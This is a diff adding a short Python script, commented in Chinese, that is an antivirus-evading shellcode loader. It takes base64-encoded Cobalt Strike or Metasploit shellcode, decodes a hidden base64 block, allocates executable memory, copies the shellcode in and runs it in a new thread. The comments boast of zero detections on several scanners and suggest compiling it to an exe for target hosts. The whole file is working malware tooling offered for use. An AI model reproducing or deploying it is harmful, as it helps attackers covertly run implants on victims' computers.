@@ -1,0 +1,20 @@
+import base64,ctypes
+
+# 多重base64编码免杀技术，火绒杀毒检测通过。微步云沙箱,virus total,virscan全部0报毒，免杀率100%（检测时间2023年2月28日23:11:31）
+# 如果被控主机上没有装有python环境，可以把此文件编译成exe文件再进行渗透
+# 先编码，再把编码的结果填进执行部分，最终执行时记得把编码部分注释掉，只执行上线部分
+
+
+# 编码部分
+# cd单引号的值填的是经过base64编码的shellcode(cs,msf生成都可以)
+cd=''
+zx='c2M9YmFzZTY0LmI2NGRlY29kZShjZCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MucmVzdHlwZT1jdHlwZXMuY191aW50NjQKc2hhbmd4aWFuID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoMCwgbGVuKHNjKSwgMHgxMDAwLCAweDQwKQpjdHlwZXMud2luZGxsLmtlcm5lbDMyLlJ0bE1vdmVNZW1vcnkoY3R5cGVzLmNfdWludDY0KHNoYW5neGlhbiksIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzYyksIGxlbihzYykpCmhhbmRsZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuQ3JlYXRlVGhyZWFkKDAsIDAsIGN0eXBlcy5jX3VpbnQ2NChzaGFuZ3hpYW4pLCAwLCAwLCAwKQpjdHlwZXMud2luZGxsLmtlcm5lbDMyLldhaXRGb3JTaW5nbGVPYmplY3QoaGFuZGxlLCAtMSkKano9YmFzZTY0LmI2NGVuY29kZShqeik='
+zx=base64.b64decode(zx)
+exec(zx)
+
+
+# 上线部分
+# zx2填入的是整个编码部分代码的base64编码
+zx2=''
+zx2=base64.b64decode(zx2)
+exec(zx2)
